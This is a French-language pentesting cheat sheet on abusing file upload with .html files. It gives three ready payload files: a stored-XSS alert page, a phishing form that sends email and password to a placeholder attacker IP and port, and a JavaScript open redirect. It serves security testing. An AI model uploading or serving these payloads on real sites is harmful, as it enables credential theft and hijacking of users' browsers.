# HTML

<img src="logo_html5.png" title="" alt="" height="150">

**Facteur de risque** : XSS, HTML Injection, Open Redirection

**Extension** : `.html`, `.htm`

**Type MIME** : `text/html`

**Description** : 

Le **H**yper**T**ext **M**arkup **L**anguage (**HTML** ou **HTML5**) est un langage de balisage conçu pour représenter les pages web.

## Sommaire

- Cross-site scripting (XSS)

## Cross-site scripting (XSS)

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

Le code HTML suivant fait apparaître un pop up :

**xss.html**, **xss.htm**

```html
<!DOCTYPE html>
<html>
<body>

<h1>Stored XSS</h1>

<script>alert(1)</script>

</body>
</html>
```

## HTML Injection

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

Dans certaines contextes, le payload XSS peut être refusé. Mais l'injection de code HTML est toujours possible.
Pourvoir exécuter de l'HTML permet à un attaqueur d'effectuer du **phishing**, contourner le CSP (**CSP bypass**) etc.

Un exemple pour le phishing :

**html\_phishing.html**, **html\_phishing.htm**

```html
<!DOCTYPE html>
<html>
<body>
    <style>
        h1 {color: green}
    </style>
    <h1>HTML Injection : Phishing</h1>
    <b>Entrez vos identifiants :</b>
    <form action="http://xxx.xxx.xxx.xxx:1234" method="GET">
         <input type="text" name="email" placeholder="Email"/>
        <input type="password" name="password" placeholder="Mot de passe"/>
        <input type="submit" value="Submit"/>
    </form>
</body>
</html>
```

## Open Redirection

### Pré-requis

- Le fichier doit être accessible après avoir été uploadé

### Attaque

Le code suivant permet une redirection sur google.com :

**openredirect.html**, **openredirect.htm**

```html
<!DOCTYPE html>
<html>
<body>
<script>
    window.location = "https://www.google.com/";
</script>
</body>
</html>
```

## References

[PayloadsAllTheThings/xss.htm at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/xss.htm)

[PayloadsAllTheThings/xss.html at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20HTML/xss.html)

[What Are HTML Injections | Acunetix](https://www.acunetix.com/blog/web-security-zone/html-injections/)

## Todo

Crée des fichiers JavaScript ?
